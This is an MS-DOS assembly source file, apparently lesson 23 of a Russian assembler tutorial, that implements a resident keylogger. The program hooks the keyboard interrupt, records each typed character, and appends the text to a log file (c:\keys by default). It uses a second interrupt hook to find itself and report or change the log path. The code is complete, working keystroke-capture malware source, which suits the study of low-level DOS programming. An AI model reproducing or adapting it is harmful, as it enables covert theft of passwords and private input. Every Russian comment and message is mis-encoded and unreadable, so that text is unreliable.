
;            RESID23.ASM - �ணࠬ�� � ����� � 23

; (�) ����᪨� �ࠢ� �� 䠩��-�ਫ������ �ਭ������� ����� �����
; "��ᥬ����? �� ����! �稬�� �ணࠬ��஢��� ��� MS-DOS"
; ����: ����譨��� ���� ����ᠭ�஢�� (e-mail: Assembler@Kalashnikoff.ru)
;	 http://www.Kalashnikoff.ru

; --- ��ᥬ���஢���� (����祭�� *.com 䠩��) ---
;�� �ᯮ�짮����� MASM 6.11 - 6.13:
;ML.EXE resid23.asm /AT

;�� �ᯮ�짮����� TASM:
;TASM.EXE resid23.asm
;TLINK.EXE resid23.obj /t/x


;   === ��砫� �ணࠬ��: ===
.286
cseg segment
assume cs:cseg, ds:cseg, ss:cseg, es:cseg
org 100h

Begin:
    jmp Init ; �� ���� ���樠����樨


; === ��ࠡ��稪 10h-��� ���뢠��� ===
Int_10h_proc proc
       cmp ax,0FAAFh ;�� �� �஢��塞 �� ������� ����㧪�?
       jne Next_step ;��� - ᬮ�ਬ �����... 

       xchg ah,al    ;�� - ���塞 ���⠬� ah/al
       iret

Next_step:
       cmp ax,0FBAFh ;�� �� ����砥� ⥪�騩 ���� log-䠩��?
       jne Run_int   ;��� - ��।��� �ࠢ����� 10h-���뢠���... 

       push cs       ;����ᨬ � ES ᥣ���� log-䠩��.
       pop es
       mov di,offset File_name ;����ᨬ � DI ᬥ饭�� log-䠩��
       iret          ;��室��...

Run_int:
       jmp dword ptr cs:[0F8h] ;��।��� �ࠢ����� 10h-���뢠���.
Int_10h_proc endp


; === ��ࠡ��稪 09h-��� ���뢠��� ===
Int_09h_proc proc
       cli    ;����頥� �� ���뢠���
       pushf  ;����� ᯥࢠ �ࠢ�����...
       call dword ptr cs:[0FCh]  ;...�ਣ����쭮�� ��ࠡ��稪�

       pusha       ;���࠭�� ॣ����� � �⥪�...
       push es
       push ds

       cld         ;���ࠢ����� - ���।!

       in al,60h         ;����稬 ����-��� ����⮩ ������.
       test al,10000000b ;(=80h) �� ���᪠��� ������?
       jnz Exit_09h      ;�᫨ ⠪, � ��࠭��� �� ��� �� ���� 

       mov ax,cs   ;�������� ॣ����� ������ 㪠�뢠�� �� ��� ᥣ����.
       mov ds,ax
       mov es,ax

       mov ah,1    ;����稬 ASCII-��� ����⮩ ������.
       int 16h
       jz Ext_code ;���� ���������� ����? ����� �� ��室. 

       or al,al        ;������ ���७�� ���?
       jz Flash_buffer ;����� ��࠭�� ��, �� �������. 

       cmp al,13       ;������ Enter?
       jz Flash_buffer ;����� ��࠭塞 �������� ᨬ����. 

       cmp al,27   ;ESC �ய�᪠��...
       jz Ext_code

       cmp al,8    ;������ Backspace?
       jz Del_sym  ;����� 㤠�塞 ��᫥���� ᨬ��� �� ���� 

       cmp al,09   ;������ TAB?
       jne NoTab_pressed ;����� ���� �����塞 ��� �� �஡��.
       mov al,32

NoTab_pressed:
       cmp al,32   ;������ ��-� ������⭮� (��� ����� 20h)?
       jb Ext_code ;����� �� ��室... 

       call Store_sym ;���� ����ᨬ �������� ᨬ��� � ���� ����������. 

Ext_code:
Exit_09h:
       pop ds ;����⠭���� ��࠭���� ॣ�����...
       pop es
       popa

       sti   ;����訬 ���뢠��� �
       iret  ;��室�� �� ��楤���.


Flash_buffer:
       call Save_string   ;���࠭塞 ��������� ��ப� � 䠩�. 
       jmp short Exit_09h ;�� ��室. 

Del_sym:
       call Del_symbol    ;���짮��⥫� ����� BackSpace!
       jmp short Exit_09h ;�� ��室. 

Int_09h_proc endp


; === ����塞 �������� ᨬ���, �᫨ ���짮��⥫� ����� BackSpace ===
Del_symbol proc
       mov ax,cs:[0F6h] ;����ᥬ � AX ������⢮ ��������� ᨬ�����.
       or ax,ax         ;���� ����?
       jz Exit_del      ;����� �� ��室. 
       dec word ptr cs:[0F6h] ;���� 㬥��蠥� ���稪.
Exit_del:
       ret
Del_symbol endp

; === ����ᨬ �������� ᨬ��� � ��� ���� ===
Store_sym proc
       mov di,cs:[0F6h] ;����ᥬ � DI ������⢮ ��������� ᨬ�����
       cmp di,79        ;��� ����� 79?
       jb OK_store ;���, �����. ����� �����뢠�� � ���� ��।��� ᨬ���. 

       push di     ;���� ��ᨬ ���� � 䠩�.
       push ax
       call Save_string
       pop ax
       pop di

OK_store:
       stosb ;����ᥬ ��।��� ᨬ��� � ����.
       inc word ptr cs:[0F6h] ;�����稬 ���稪.
       ret   ;��୥���... 
Store_sym endp

; === �����뢠�� ��������� ��ப� � 䠩� ===
Save_string proc
       mov di,cs:[0F6h] ;����ᥬ � DI ������⢮ ᨬ����� � ����.
       or di,di         ;��� ࠢ�� 0?
       jz Nothing_save  ;����� ����� � 䠩� ��祣� �� ����. 
       add word ptr cs:[0F6h],2 ;���� ����襬 � ����� ��ப�...
       mov ax,0A0Dh             ;...���室 �� ����� ��ப�
       stosw                    ;(��� 㤮��⢠ �⥭��).

       mov ax,3D02h    ;��஥� 䠩� ��� �⥭��/�����.
       mov dx,offset File_name
       int 21h
       jc Nothing_save ;�� �訡�� - �� ��室... 
       mov Handle,ax

       mov bx,ax
       mov ax,4202h    ;��⠭���� 㪠��⥫� �� ����� 䠩��.
       xor cx,cx
       xor dx,dx
       int 21h

       mov cx,cs:[0F6h] ;CX=������⢮ �����뢠���� ᨬ�����.
       mov bx,Handle
       xor dx,dx        ;��襬 � ᠬ��� ��砫� ����.
       mov ah,40h
       int 21h          ;������塞 � 䠩� �������� ᨬ����...

       mov bx,Handle    ;���஥� 䠩�.
       mov ah,3Eh
       int 21h

Nothing_save:
       mov word ptr cs:[0F6h],0 ;���㫨� ���� �����.
       ret ;��୥���.

File_name db 'c:\keys', 19 dup (0) ;��� 䠩�� ��� �࠭���� ��������� ᨬ�����.
Handle dw ?
Save_string endp


;   === ���樠������ (�����⮢�� � ����ன�� १�����) ===
Init:
       mov ax,0FAAFh ;�஢�ઠ �� ������� ����㧪�.
       int 10h
       cmp ax,0AFFAh
       jne Next_step2

       mov ah,9      ;�� 㦥 � �����! �뢥��� ᮮ⢥�������� ��ப�.
       mov dx,offset Mess_memory
       int 21h

       mov ax,0FBAFh ;����稬 ᥣ���� � ᬥ饭�� ����� log-䠩��
       int 10h

       mov dx,di     ;����稬 ��������� ��ப�
       call Get_cmd

       mov ah,3Ch    ;�������� ���� 䠩� ��� ����� ��������� ᨬ�����.
       xor cx,cx     ;��ਡ��� �����
       push es
       pop ds
       int 21h

       push cs
       pop ds

       mov bx,ax
       mov ah,3Eh ;��᫥ ᮧ�����/������ 䠩��, ��� �㦭� �������!
       int 21h

No_cmdline:
       ret   ;�멤�� � DOS...

Next_step2:
       mov di,offset File_name ;DI - �㤠 �㤥� ������� ��ࠬ���� ���.��ப�.
       call Get_cmd ;����稬 ��������� ��ப�... 

       mov ah,9
       lea dx,Mess_hello ;!!! LEA DX ����� MOV DX, OFFSET
       int 21h

       mov es,word ptr cs:[2Ch] ;����稬 ᥣ���� ���㦥��� DOS.
       mov ah,49h               ;�㭪�� �᢮�������� �����.
       int 21h                  ;�᢮������� ������...

       mov word ptr cs:[0F6h],0 ;���㫨� ���� ����� ᨬ�����.

;�஢�ਬ, ������� �� 㦥 ��� log-䠩�.
       mov ax,3D00h
       mov dx,offset File_name
       int 21h
       jnc Ok_file

;�᫨ �� �������, �:
       mov ah,3Ch ;�������� ���� 䠩� ��� ����� ��������� ᨬ�����.
       xor cx,cx  ;��ਡ��� �����
       mov dx,offset File_name
       int 21h

Ok_file:
       mov bx,ax
       mov ah,3Eh ;��᫥ ᮧ�����/������ 䠩��, ��� �㦭� �������!
       int 21h

; === 09h ===
       mov ax,3509h
       int 21h ;����稬 � ��࠭�� ���� (�����) 09h ���뢠���
       mov word ptr cs:[0FCh],bx ;���饭��...
       mov word ptr cs:[0FEh],es ;�������...

       mov ax,2509h
       lea dx,Int_09h_proc
       int 21h  ;"����ᨬ" ���� ��楤��� �� 09h ���뢠���

; === 10h ===
       mov ax,3510h
       int 21h ;����稬 � ��࠭�� ����� 10h ���뢠���
       mov word ptr cs:[0F8h],bx
       mov word ptr cs:[0FAh],es

       mov ax,2510h
       lea dx,Int_10h_proc
       int 21h  ;"����ᨬ" ���� ��楤��� �� 10h ���뢠���

       lea dx,Init
       int 27h  ;��⠢�� ���� �ணࠬ�� � �����.


; --- ����稬 ��ࠬ���� � ��������� ��ப� ---
Get_cmd proc
       mov si,80h   ;SI=ᬥ饭�� ��������� ��ப�.
       lodsb        ;����稬 ���-�� ᨬ�����.
       cmp al,25    ;����� 25?
       ja No_string ;�� - �� ���� No_string 
       or al,al     ;��� ��������� ��ப�?
       jz No_string ;�� ���� No_string 

       inc si       ;������ SI 㪠�뢠�� �� ���� ᨬ��� ��ப�.

Next_char:
       lodsb      ;����砥� ��।��� ᨬ���.
       cmp al,0Dh ;����� ��ப�?
       je Got_cmd ;�� - �� ��室... 
       stosb      ;���� - ��࠭�� ᨬ��� � ��६����� File_name
       jmp short Next_char ;������騩 ᨬ���... 

Got_cmd:
       xor al,al ;��ப� ����祭�! ����襬 ASCII 0 � �����
       stosb
       clc  ;���ᨬ 䫠� ��७��...
       ret  ;��室�� �� ��楤���

No_string:
       stc  ;��ப� ����ୠ! ��⠭���� 䫠� ��७��.
       ret  ;��室�� �� ��楤���
Get_cmd endp


;  === ����饭�� ===
Mess_hello db '�������� � ����� "��ᥬ����? �� ����! �稬�� �ணࠬ��஢���", ����� � 23.',0Ah,0Dh,0Ah
           db '����: ����譨��� ���� ����ᠭ�஢�� (Assembler@Kalashnikoff.ru),',0Ah,0Dh
           db 'http://www.Kalashnikoff.ru, �����, ��᪢�, 2001 ���.',0Ah,0Dh,0Ah
           db '��� ᬥ�� ⥪�饣� LOG-䠩�� ����室��� �������� ������ �ணࠬ�� �����,',0Ah,0Dh
           db '㪠��� � ��ࠬ���� ��������� ��ப� ���� ���� � 䠩�� �� ����� 25 ᨬ�����.',0Ah,0Dh,'$'

Mess_memory db 0Ah,0Dh,'�ணࠬ�� 㦥 ����㦥�� � ������! �ந������� ᫥���騥 ����⢨�:',0Ah,0Dh,0Ah
            db '* �᫨ � ��������� ��ப� �� 㪠��� LOG-䠩�, � �������騩 ��������.',0Ah,0Dh
            db '* �᫨ 䠩� 㪠��� (���ਬ��: RESID23.COM D:\KEYS.TXT), � �� ᮧ������.',0Ah,0Dh,'$'
cseg ends
end Begin
